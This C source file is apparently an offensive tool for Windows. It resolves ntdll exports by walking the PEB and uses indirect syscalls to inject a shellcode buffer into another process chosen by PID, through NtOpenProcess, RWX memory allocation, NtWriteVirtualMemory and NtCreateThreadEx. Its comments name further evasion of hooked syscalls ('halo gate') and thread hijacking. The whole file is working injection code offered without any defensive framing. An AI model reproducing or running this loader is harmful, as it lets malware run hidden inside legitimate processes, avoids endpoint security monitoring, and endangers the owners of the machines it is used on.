#include <windows.h>
#include <winnt.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include <api.h>



BYTE* GetModuleBase(){
    PPEB peb=(PPEB)__readgsqword(0x60);
    PLDR_MODULE pLoadModule; // dll specific 
    pLoadModule=(PLDR_MODULE)((BYTE*)peb->Ldr->InMemoryOrderModuleList.Flink->Flink-0x10);
    return pLoadModule->BaseAddress;
}


BYTE* GetFunctionBase(BYTE*base,DWORD* addr_offsets,DWORD* name_offsets,WORD* ordinal_offsets,DWORD* name_size,char* function){

 for(DWORD i=0;i<*name_size;i++){
  char* name=(char*)(base+name_offsets[i]);
  if(!strcmp(name,function)){
     WORD ordinal_value=(WORD)ordinal_offsets[i];
     return(BYTE*)(base+(DWORD)addr_offsets[ordinal_value]);
  }
 }
return NULL;
}

DWORD getSSN(BYTE* function_base){
// might be replaaced with halo gate approch to evade hooked sysclls.
  DWORD __SSN; 
  unsigned int i=0;
  while(1){
 if(function_base[i]==0x4c && 
    function_base[i+1]==0x8b &&
    function_base[i+2]==0xd1 &&
    function_base[i+3]==0xb8  
 ){
 __SSN=(DWORD)function_base[i+4];
    break;
 }
 i++;
  }
    return __SSN;
}
BYTE* getSyscall(BYTE* function_base){
BYTE* addr=NULL;
unsigned int i=0;
while (1){
if(function_base[i]==0x4c && 
    function_base[i+1]==0x8b &&
    function_base[i+2]==0xd1 &&
    function_base[i+3]==0xb8  
 ){
    addr=(BYTE*)function_base+18;
    break;
 }
 i++;
}
    return addr;
}



int main(int argc,char**argv){
   BYTE*base=(BYTE*)GetModuleBase(); 
   if(base){
    printf("[+] ntdll base addr\n");
   }

   DWORD pe_lfanew=*(DWORD*)(base+0x3c);

   BYTE* nt_headers=(BYTE*)(base+pe_lfanew);
   BYTE*  optional_header=(BYTE*)(nt_headers+0x18);
   ULONG exp_dir_rva=*(ULONG*)(optional_header+0x70);
   BYTE* export_directory=(BYTE*)base+exp_dir_rva;
   
   DWORD number_of_names=*(DWORD*)(export_directory+0x18); //24
   DWORD _addr_offsets=*(DWORD*)(export_directory+0x1C); // RVA to base
   DWORD _name_offsets=*(DWORD*)(export_directory+0x20); // RVA to base
   DWORD _ordinal_offsets=*(DWORD*)(export_directory+0x24); // RVA to base

   DWORD* addr_offsets=(DWORD*)(base+_addr_offsets);
   DWORD* name_offsets=(DWORD*)(base+_name_offsets);
   WORD* ordinal_offsets=(WORD*)(base+_ordinal_offsets);


  
   BYTE* Pwrvirmem=GetFunctionBase(base,addr_offsets,name_offsets,ordinal_offsets,&number_of_names,"NtWriteVirtualMemory"); // syscall insruction is to 0x12 offset
   BYTE* Popproc=GetFunctionBase(base,addr_offsets,name_offsets,ordinal_offsets,&number_of_names,"NtOpenProcess");
   BYTE* Pallvirmem=GetFunctionBase(base,addr_offsets,name_offsets,ordinal_offsets,&number_of_names,"NtAllocateVirtualMemoryEx");
   BYTE* Pcrth=GetFunctionBase(base,addr_offsets,name_offsets,ordinal_offsets,&number_of_names,"NtCreateThreadEx");

  


   if(!Pcrth || !Pwrvirmem ||  !Popproc || !Pallvirmem)
   {    
    printf("failed to get addr of functions\n");
    getchar();  
    exit(1);   
   } 

   __SYSCALL_ADDR=getSyscall(Pallvirmem);
    SSN_wrvirmem=getSSN(Pwrvirmem);
    SSN_opproc=getSSN(Popproc);
    SSN_allvirmem=getSSN(Pallvirmem);
    SSN_crth=getSSN(Pcrth);


   // call functions
   DWORD pid=(DWORD)atoi(argv[1]);
   printf("PID: %i\n",pid);

   HANDLE phandle=NULL;
   OBJECT_ATTRIBUTES p_OBJ_ATTR={
    sizeof(OBJECT_ATTRIBUTES),
    0,
    NULL,
    0,
    0,
    0
   };
   CLIENT_ID client_id={0};
   client_id.UniqueProcess=(HANDLE)(ULONG_PTR)pid;
   client_id.UniqueThread=NULL;
   _impopproc(&phandle,PROCESS_ALL_ACCESS,&p_OBJ_ATTR,(PCLIENT_ID)&client_id);
 
   void *mem_base_addr=NULL;
   SIZE_T shellcode_size=sizeof(buf);
  
   NTSTATUS s0=_impallvirmem(
    phandle,
    &mem_base_addr,
    &shellcode_size,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE,
    NULL,
    0
);
    

  
   SIZE_T written=0;
   NTSTATUS s1=_impwrvirmem(phandle,mem_base_addr,buf,shellcode_size,&written);
   HANDLE thandle=NULL;
   OBJECT_ATTRIBUTES t_OBJ_ATTR={
    sizeof(OBJECT_ATTRIBUTES),
    0,
    NULL,
    0,
    0,
    0
   };
 
   // might be changed to thread hijaking
   NTSTATUS s2=_impcrth(
    &thandle,
    THREAD_ALL_ACCESS,
    &t_OBJ_ATTR,
    phandle,
    (PTHREAD_START_ROUTINE)mem_base_addr,
    NULL,
    0,
    0,
    0,
    0,
    NULL
);
     
    return 0;
}
